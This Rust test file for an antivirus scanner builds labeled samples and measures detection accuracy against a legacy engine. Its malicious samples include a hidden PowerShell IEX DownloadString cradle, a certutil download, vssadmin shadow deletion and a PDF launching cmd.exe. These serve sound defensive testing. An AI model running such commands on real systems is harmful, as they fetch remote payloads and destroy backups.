use samulibre_scanner::{
    DetectionAuditLedger, FalsePositiveRegistry, MultiEngineScanner,
};
use samulibre_types::{ConfidenceLevel, FileScanStatus};
use std::fs;
use std::path::PathBuf;
use std::time::Instant;

struct LabeledSample {
    name: &'static str,
    rel_path: &'static str,
    bytes: Vec<u8>,
    expected_malicious: bool,
    category: &'static str,
}

fn build_synthetic_pe(
    high_entropy: bool,
    with_wx_injection: bool,
    with_nsis: bool,
    with_dotnet: bool,
) -> Vec<u8> {
    let mut buf = vec![0u8; 24 * 1024];
    // DOS header MZ + e_lfanew at 0x3C -> 0x80
    buf[0] = b'M';
    buf[1] = b'Z';
    buf[0x3C..0x40].copy_from_slice(&0x80u32.to_le_bytes());

    // PE signature at 0x80
    buf[0x80..0x84].copy_from_slice(b"PE\0\0");
    // COFF: Machine x64 (0x8664), NumberOfSections = 2, SizeOfOptionalHeader = 0xF0
    buf[0x84..0x86].copy_from_slice(&0x8664u16.to_le_bytes());
    buf[0x86..0x88].copy_from_slice(&2u16.to_le_bytes());
    buf[0x94..0x96].copy_from_slice(&0xF0u16.to_le_bytes());
    // Optional Header Magic PE32+ (0x20B) at 0x98
    buf[0x98..0x9A].copy_from_slice(&0x20Bu16.to_le_bytes());

    // Section Table starts at 0x98 + 0xF0 = 0x188
    // Section 1: .text
    let s1 = 0x188;
    buf[s1..s1 + 5].copy_from_slice(b".text");
    buf[s1 + 8..s1 + 12].copy_from_slice(&0x1000u32.to_le_bytes()); // VirtualSize
    buf[s1 + 12..s1 + 16].copy_from_slice(&0x1000u32.to_le_bytes()); // VirtualAddr
    buf[s1 + 16..s1 + 20].copy_from_slice(&0x1000u32.to_le_bytes()); // RawSize
    buf[s1 + 20..s1 + 24].copy_from_slice(&0x400u32.to_le_bytes()); // RawPtr
    let s1_chars: u32 = if with_wx_injection {
        0xE000_0020 // CODE | EXECUTE | READ | WRITE (WX)
    } else {
        0x6000_0020 // CODE | EXECUTE | READ
    };
    buf[s1 + 36..s1 + 40].copy_from_slice(&s1_chars.to_le_bytes());

    // Section 2: .rdata
    let s2 = s1 + 40;
    buf[s2..s2 + 6].copy_from_slice(b".rdata");
    buf[s2 + 8..s2 + 12].copy_from_slice(&0x1000u32.to_le_bytes());
    buf[s2 + 12..s2 + 16].copy_from_slice(&0x2000u32.to_le_bytes());
    buf[s2 + 16..s2 + 20].copy_from_slice(&0x1000u32.to_le_bytes());
    buf[s2 + 20..s2 + 24].copy_from_slice(&0x1400u32.to_le_bytes());
    buf[s2 + 36..s2 + 40].copy_from_slice(&0x4000_0040u32.to_le_bytes());

    if high_entropy {
        // Pseudo-random deterministic high-entropy payload (> 7.90 bits/byte)
        let mut x: u64 = 0x9E37_79B9_7F4A_7C15;
        for b in buf[0x400..].iter_mut() {
            x = x.wrapping_mul(6364136223846793005).wrapping_add(1442695040888963407);
            *b = (x >> 56) as u8;
        }
    }

    if with_nsis {
        let marker = b"NullsoftInst";
        buf[0x400..0x400 + marker.len()].copy_from_slice(marker);
    }
    if with_dotnet {
        let marker = b"BSJB\x01\x00\x01\x00";
        buf[0x420..0x420 + marker.len()].copy_from_slice(marker);
    }
    if with_wx_injection {
        let apis = b"VirtualAllocEx\0WriteProcessMemory\0CreateRemoteThread\0NtUnmapViewOfSection\0";
        buf[0x440..0x440 + apis.len()].copy_from_slice(apis);
    }

    buf
}

fn legacy_single_signal_is_threat(scanner: &MultiEngineScanner, path: &PathBuf, bytes: &[u8]) -> bool {
    // Simula el motor anterior basado en señal única (early-return sin correlación):
    // 1) Si es PDF sospechoso, 2) Si PE tiene entropía > 7.85 o es polimórfico,
    // 3) Si PeAnalyzer marca cualquier score o si coincide alguna regla de patrón.
    if bytes.starts_with(b"%PDF") {
        let s = String::from_utf8_lossy(bytes).to_ascii_lowercase();
        if s.contains("/launch") || s.contains("/javascript") {
            return true;
        }
    }
    if bytes.starts_with(b"MZ") && bytes.len() > 10 * 1024 {
        let sample_len = bytes.len().min(64 * 1024);
        let h = samulibre_scanner::gpu_hook::accelerated_entropy(&bytes[..sample_len]);
        if h > 7.85 {
            return true;
        }
        if let Some(pe) = samulibre_scanner::PeAnalyzer::analyze(bytes) {
            if pe.is_suspicious || !pe.indicators.is_empty() {
                return true;
            }
        }
    }
    let res = scanner.scan_bytes(bytes, &path.to_string_lossy());
    res.status != FileScanStatus::Clean
}

#[derive(Default, Debug)]
struct Metrics {
    tp: usize,
    fp: usize,
    tn: usize,
    fn_count: usize,
}

impl Metrics {
    fn record(&mut self, expected_mal: bool, predicted_mal: bool) {
        match (expected_mal, predicted_mal) {
            (true, true) => self.tp += 1,
            (false, true) => self.fp += 1,
            (false, false) => self.tn += 1,
            (true, false) => self.fn_count += 1,
        }
    }

    fn precision(&self) -> f64 {
        if self.tp + self.fp == 0 {
            1.0
        } else {
            self.tp as f64 / (self.tp + self.fp) as f64
        }
    }

    fn recall(&self) -> f64 {
        if self.tp + self.fn_count == 0 {
            1.0
        } else {
            self.tp as f64 / (self.tp + self.fn_count) as f64
        }
    }

    fn f1(&self) -> f64 {
        let p = self.precision();
        let r = self.recall();
        if p + r == 0.0 {
            0.0
        } else {
            2.0 * p * r / (p + r)
        }
    }

    fn fp_rate(&self) -> f64 {
        if self.fp + self.tn == 0 {
            0.0
        } else {
            self.fp as f64 / (self.fp + self.tn) as f64
        }
    }
}

#[test]
fn test_reproducible_detection_lab_and_confusion_matrix() {
    let temp_root = std::env::temp_dir().join("samulibre_repro_lab_v2");
    let _ = fs::remove_dir_all(&temp_root);
    fs::create_dir_all(&temp_root).unwrap();

    let eicar: Vec<u8> = [
        2, 111, 21, 123, 10, 127, 26, 27, 10, 1, 110, 6, 10, 0, 2, 111, 110, 114, 10, 4, 115, 109,
        25, 25, 115, 109, 39, 126, 31, 19, 25, 27, 8, 119, 9, 14, 27, 20, 30, 27, 8, 30, 119, 27,
        20, 14, 19, 12, 19, 8, 15, 9, 119, 14, 31, 9, 14, 119, 28, 19, 22, 31, 123, 126, 18, 113,
        18, 112,
    ]
    .iter()
    .map(|b| b ^ 0x5A)
    .collect();

    let samples = vec![
        // === A. ARCHIVOS LEGÍTIMOS (14) ===
        LabeledSample {
            name: "Clean Standard PE",
            rel_path: "ProgramFiles/App/clean_app.exe",
            bytes: build_synthetic_pe(false, false, false, false),
            expected_malicious: false,
            category: "A_Legitimate",
        },
        LabeledSample {
            name: "NSIS High-Entropy Installer",
            rel_path: "Downloads/installer_nsis.exe",
            bytes: build_synthetic_pe(true, false, true, false),
            expected_malicious: false,
            category: "A_Legitimate",
        },
        LabeledSample {
            name: "DotNet High-Entropy Binary",
            rel_path: "ProgramFiles/DotNet/tool.dll",
            bytes: build_synthetic_pe(true, false, false, true),
            expected_malicious: false,
            category: "A_Legitimate",
        },
        LabeledSample {
            name: "Portable Packed Clean PE (Temp)",
            rel_path: "Temp/portable_tool.exe",
            bytes: build_synthetic_pe(true, false, false, false),
            expected_malicious: false,
            category: "A_Legitimate",
        },
        LabeledSample {
            name: "Unsigned High-Entropy PE (Downloads)",
            rel_path: "Downloads/unsigned_packed.exe",
            bytes: build_synthetic_pe(true, false, false, false),
            expected_malicious: false,
            category: "A_Legitimate",
        },
        LabeledSample {
            name: "Admin PowerShell Inventory Script",
            rel_path: "Scripts/audit_services.ps1",
            bytes: b"Get-Service | Where-Object {$_.Status -eq 'Running'} | Export-Csv services.csv\n".to_vec(),
            expected_malicious: false,
            category: "A_Legitimate",
        },
        LabeledSample {
            name: "Admin Certutil Hash Check",
            rel_path: "Scripts/verify_hash.bat",
            bytes: b"@echo off\ncertutil -hashfile release.zip SHA256\n".to_vec(),
            expected_malicious: false,
            category: "A_Legitimate",
        },
        LabeledSample {
            name: "Python Build Script",
            rel_path: "Dev/build_pkg.py",
            bytes: b"import os, hashlib\nprint(hashlib.sha256(b'samulibre').hexdigest())\n".to_vec(),
            expected_malicious: false,
            category: "A_Legitimate",
        },
        LabeledSample {
            name: "Clean PDF Document",
            rel_path: "Docs/manual.pdf",
            bytes: b"%PDF-1.7\n1 0 obj << /Type /Catalog >> endobj\n%%EOF\n".to_vec(),
            expected_malicious: false,
            category: "A_Legitimate",
        },
        LabeledSample {
            name: "Clean Archive ZIP",
            rel_path: "Downloads/backup.zip",
            bytes: vec![0x50, 0x4B, 0x03, 0x04].into_iter().chain(vec![0xAA; 16384]).collect(),
            expected_malicious: false,
            category: "A_Legitimate",
        },
        // === B. MUESTRAS MALICIOSAS DE PRUEBA SEGURAS (7) ===
        LabeledSample {
            name: "EICAR Standard Test",
            rel_path: "Temp/eicar_std.com",
            bytes: eicar.clone(),
            expected_malicious: true,
            category: "B_SafeMalicious",
        },
        LabeledSample {
            name: "EICAR in Downloads",
            rel_path: "Downloads/eicar_dl.exe",
            bytes: eicar.clone(),
            expected_malicious: true,
            category: "B_SafeMalicious",
        },
        LabeledSample {
            name: "Malicious PDF Launch+JS",
            rel_path: "Downloads/invoice_exploit.pdf",
            bytes: b"%PDF-1.7\n/Type /Action /S /Launch /F (cmd.exe) /JavaScript (eval(unescape('%u0041')))\n".to_vec(),
            expected_malicious: true,
            category: "B_SafeMalicious",
        },
        LabeledSample {
            name: "PE WX + Injection + High Entropy",
            rel_path: "Temp/dropper_wx.exe",
            bytes: build_synthetic_pe(true, true, false, false),
            expected_malicious: true,
            category: "B_SafeMalicious",
        },
        LabeledSample {
            name: "PowerShell Bypass + DownloadString",
            rel_path: "Temp/stage1.ps1",
            bytes: b"powershell.exe -nop -w hidden -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.10/p')\"".to_vec(),
            expected_malicious: true,
            category: "B_SafeMalicious",
        },
        LabeledSample {
            name: "AMSI Bypass + Credential Harvester",
            rel_path: "Temp/stealer_amsi.ps1",
            bytes: b"# amsiscanbuffer VirtualProtect 0xc3\n# CryptUnprotectData User Data Login Data Cookies".to_vec(),
            expected_malicious: true,
            category: "B_SafeMalicious",
        },
        LabeledSample {
            name: "Ransomware VSS Wiper + LOLBin",
            rel_path: "Temp/wiper_test.bat",
            bytes: b"vssadmin.exe delete shadows /all /quiet\ncertutil.exe -urlcache -f -split http://198.51.100.2/x.exe".to_vec(),
            expected_malicious: true,
            category: "B_SafeMalicious",
        },
        // === C. CASOS NEGATIVOS DIFÍCILES (4) ===
        LabeledSample {
            name: "HardNeg: Unsigned High Entropy Only",
            rel_path: "CustomApp/compressed_asset.exe",
            bytes: build_synthetic_pe(true, false, false, false),
            expected_malicious: false,
            category: "C_HardNegative",
        },
        LabeledSample {
            name: "HardNeg: PDF Prose Mentioning eval",
            rel_path: "Docs/js_book.pdf",
            bytes: b"%PDF-1.4\n(This chapter explains eval(x) in JavaScript textbooks)\n".to_vec(),
            expected_malicious: false,
            category: "C_HardNegative",
        },
        LabeledSample {
            name: "HardNeg: Clean Rust Source",
            rel_path: "Src/notes.rs",
            bytes: b"// Documentation discussing amsiscanbuffer and vssadmin telemetry safely\nfn main() {}".to_vec(),
            expected_malicious: false,
            category: "C_HardNegative",
        },
        LabeledSample {
            name: "HardNeg: Clean Sysadmin PowerShell",
            rel_path: "Admin/cleanup.ps1",
            bytes: b"Get-ChildItem $env:TEMP | Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-7) }".to_vec(),
            expected_malicious: false,
            category: "C_HardNegative",
        },
        LabeledSample {
            name: "HardNeg: Cygwin/MSYS2 WX Section Only",
            rel_path: "ProgramFiles/Git/msys-2.0.dll",
            bytes: {
                let mut pe = build_synthetic_pe(false, false, false, false);
                // Ajustar la primera sección para tener flag WX (0x80000000 | 0x20000000) sin APIs de inyección
                let sec_off = 0x80 + 24 + 224;
                pe[sec_off + 36..sec_off + 40].copy_from_slice(&(0x8000_0000u32 | 0x2000_0000u32).to_le_bytes());
                pe
            },
            expected_malicious: false,
            category: "C_HardNegative",
        },
        LabeledSample {
            name: "HardNeg: Adobe AcroForm PDF (/JavaScript + app.alert)",
            rel_path: "ProgramFiles/Adobe/Acrobat/template1.pdf",
            bytes: b"%PDF-1.7\n1 0 obj << /Type /Action /S /JavaScript /JS (app.alert('Complete los campos requeridos')) >> endobj\n%%EOF\n".to_vec(),
            expected_malicious: false,
            category: "C_HardNegative",
        },
    ];

    let scanner = MultiEngineScanner::new();
    let mut legacy_metrics = Metrics::default();
    let mut new_metrics = Metrics::default();

    let start_all = Instant::now();
    for s in &samples {
        let p = temp_root.join(s.rel_path);
        if let Some(parent) = p.parent() {
            fs::create_dir_all(parent).unwrap();
        }
        fs::write(&p, &s.bytes).unwrap();

        let legacy_pred = legacy_single_signal_is_threat(&scanner, &p, &s.bytes);
        legacy_metrics.record(s.expected_malicious, legacy_pred);

        let mut res = scanner.scan_file(&p).unwrap();
        // Si Windows Defender del host interceptó el archivo sintético en disco (OS Error 225),
        // evaluamos el buffer en memoria con scan_bytes para medir con exactitud el motor SamuLibre.
        if res.sha256 == "BLOCKED_BY_KERNEL" {
            res = scanner.scan_bytes(&s.bytes, &p.to_string_lossy());
        }
        let new_pred = res.status != FileScanStatus::Clean;
        new_metrics.record(s.expected_malicious, new_pred);

        println!(
            "[{}] {} | expected={} | new={:?} ({:?}, score={}, ev={})",
            s.category,
            s.name,
            s.expected_malicious,
            res.status,
            res.confidence_level,
            res.calibrated_score,
            res.evidences.len()
        );
    }
    let total_ms = start_all.elapsed().as_secs_f64() * 1000.0;
    let avg_ms = total_ms / samples.len() as f64;

    println!("\n=== CONFUSION MATRIX (LEGACY vs RE-ENGINEERED) ===");
    println!(
        "LEGACY -> TP={} FP={} TN={} FN={} | Precision={:.3} Recall={:.3} F1={:.3} FP_Rate={:.3}",
        legacy_metrics.tp,
        legacy_metrics.fp,
        legacy_metrics.tn,
        legacy_metrics.fn_count,
        legacy_metrics.precision(),
        legacy_metrics.recall(),
        legacy_metrics.f1(),
        legacy_metrics.fp_rate()
    );
    println!(
        "NEW    -> TP={} FP={} TN={} FN={} | Precision={:.3} Recall={:.3} F1={:.3} FP_Rate={:.3} | Avg={:.2} ms/file",
        new_metrics.tp,
        new_metrics.fp,
        new_metrics.tn,
        new_metrics.fn_count,
        new_metrics.precision(),
        new_metrics.recall(),
        new_metrics.f1(),
        new_metrics.fp_rate(),
        avg_ms
    );

    assert_eq!(new_metrics.fp, 0, "Expected 0 false positives on labeled lab dataset");
    assert_eq!(new_metrics.fn_count, 0, "Expected 0 false negatives on safe malicious lab samples");
    assert!(legacy_metrics.fp >= 4, "Baseline legacy single-signal should produce >= 4 FPs");

    // Verificar que una exclusión por hash NO excluye otro archivo con el mismo nombre pero distinto SHA-256
    let mut scanner_excl = MultiEngineScanner::new();
    let file_a = temp_root.join("same_name_test/tool.com");
    fs::create_dir_all(file_a.parent().unwrap()).unwrap();
    fs::write(&file_a, b"clean_version_a").unwrap();
    let _ = scanner_excl.add_pinned_exclusion(&file_a, "Test hash pinning");
    // Sobreescribir mismo nombre con EICAR (nuevo SHA-256)
    fs::write(&file_a, &eicar).unwrap();
    let res_after_overwrite = scanner_excl.scan_file(&file_a).unwrap();
    assert_eq!(res_after_overwrite.status, FileScanStatus::Infected);
    assert_eq!(res_after_overwrite.confidence_level, ConfidenceLevel::Critico);

    // Verificar Ledger criptográfico tamper-evident + FP Registry
    let ledger_path = temp_root.join("audit/detection_ledger.jsonl");
    DetectionAuditLedger::append_entry(
        &ledger_path,
        "DETECTION",
        "abc123",
        "C:\\Temp\\test.exe",
        "EICAR",
        "CRÍTICO / MALICIOSO CONFIRMADO",
        100,
        "Engine",
        "Prueba de integridad",
    )
    .unwrap();
    let (ok, count) = DetectionAuditLedger::verify_integrity(&ledger_path).unwrap();
    assert!(ok && count == 1);

    let fp_reg_path = temp_root.join("audit/fp_feedback.json");
    let fp_entry = FalsePositiveRegistry::record_fp(
        &fp_reg_path,
        "deadbeef",
        "C:\\Tools\\clean.exe",
        "SomeRule",
        "Signed vendor binary",
    )
    .unwrap();
    assert_eq!(fp_entry.rule_review_status, "PendienteRevisiónRegla");

    #[cfg(target_os = "windows")]
    {
        let notepad = std::path::Path::new(r"C:\Windows\System32\notepad.exe");
        if notepad.exists() {
            let auth = samulibre_scanner::verify_authenticode_cached(
                notepad,
                "notepad_winverifytrust_test",
                true,
            );
            assert!(auth.is_signed);
            assert!(
                auth.is_valid_chain,
                "notepad.exe debe validar cadena Authenticode real: {:?}",
                auth
            );
            let pub_name = auth.publisher.as_deref().unwrap_or("");
            assert!(
                pub_name.to_ascii_lowercase().contains("microsoft"),
                "El publicador extraído de notepad.exe debe ser Microsoft, recibido: {:?}",
                auth.publisher
            );
        }
    }

    let _ = fs::remove_dir_all(&temp_root);
}
